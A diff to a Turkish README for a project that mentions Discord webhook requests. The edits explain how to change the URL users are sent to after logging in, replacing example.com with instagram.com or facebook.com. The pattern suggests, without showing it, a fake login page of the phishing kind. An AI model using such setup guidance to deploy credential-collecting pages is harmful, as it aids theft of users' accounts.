@@ -62,10 +62,11 @@ Bu yöntem hem frontend hem de backend kodunu içerir. Discord webhook istekleri
 Kullanıcılar giriş yaptıktan sonra yönlendirilecek URL'i değiştirmek için:
 
 1. Eğer statik versiyonu kullanıyorsanız:
-   - `public/assets/index-*.js` dosyasında `example.com` aramasi yapın ve istediğiniz URL ile değiştirin
+   - `public/assets/index-*.js` dosyasında `REDIRECT_URL` veya `https://instagram.com` aramasi yapın ve istediğiniz URL ile değiştirin
+   - Örneğin: "https://instagram.com" yerine "https://facebook.com" yazabilirsiniz
 
 2. Eğer tam versiyonu kullanıyorsanız:
-   - Kaynak kodu değiştirmeniz gerekir, bunun için orijinal projeyi düzenleyin
+   - Aynı şekilde `public/assets/index-*.js` dosyasında aynı değişiklikleri yapabilirsiniz
 
 ## Güvenlik Uyarısı
 
